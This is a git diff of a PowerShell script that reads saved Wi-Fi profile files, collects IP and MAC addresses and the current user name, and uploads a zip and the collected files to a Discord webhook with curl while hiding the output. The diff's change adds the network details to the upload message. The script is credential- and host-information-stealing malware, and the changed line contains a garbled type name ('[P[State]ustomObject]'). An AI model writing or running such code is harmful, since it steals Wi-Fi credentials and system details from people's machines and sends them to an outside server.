@@ -23,10 +23,11 @@ Get-ChildItem "$e\Wi-Fi*.xml" | ForEach-Object {
 }
 
 
-$ipv4 = ipconfig /all | Select-String "IPv4 Address" | ForEach-Object { ($_ -split ':')[-1].Trim() }
-$ipv6 = ipconfig /all | Select-String "IPv6 Address" | ForEach-Object { ($_ -split ':')[-1].Trim() }
-$mac = ipconfig /all | Select-String "Physical Address" | ForEach-Object { ($_ -split ':')[-1].Trim() }
-
+$networkInfo = [P[State]ustomObject]@{
+    IPv4 = (ipconfig /all | Select-String "IPv4 Address") -split ':' | Select-Object -Last 1 -Skip 1 | ForEach-Object { $_.Trim() }
+    IPv6 = (ipconfig /all | Select-String "IPv6 Address") -split ':' | Select-Object -Last 1 -Skip 1 | ForEach-Object { $_.Trim() }
+    MAC  = (ipconfig /all | Select-String "Physical Address") -split ':' | Select-Object -Last 1 -Skip 1 | ForEach-Object { $_.Trim() }
+}   
 
 
 # Send to discord
@@ -34,9 +35,8 @@ $mac = ipconfig /all | Select-String "Physical Address" | ForEach-Object { ($_ -
 
 
 $whoami_content = whoami
-"content=@everyone: $whoami_content"
-curl.exe -X POST $wh -F "file1=@$zip" -F "file2=@$wifiFile" -F "file3=@$e\ipcfg.txt" *> $null
-Remove-Item $BodyFile   
+"content=@everyone: $whoami_content | $networkInfo  | "
+curl.exe -X POST $wh -F "file1=@$zip" -F "file2=@$wifiFile" -F "file3=@$e\ipcfg.txt" *> $null 
 
 # cleanup
 #cls
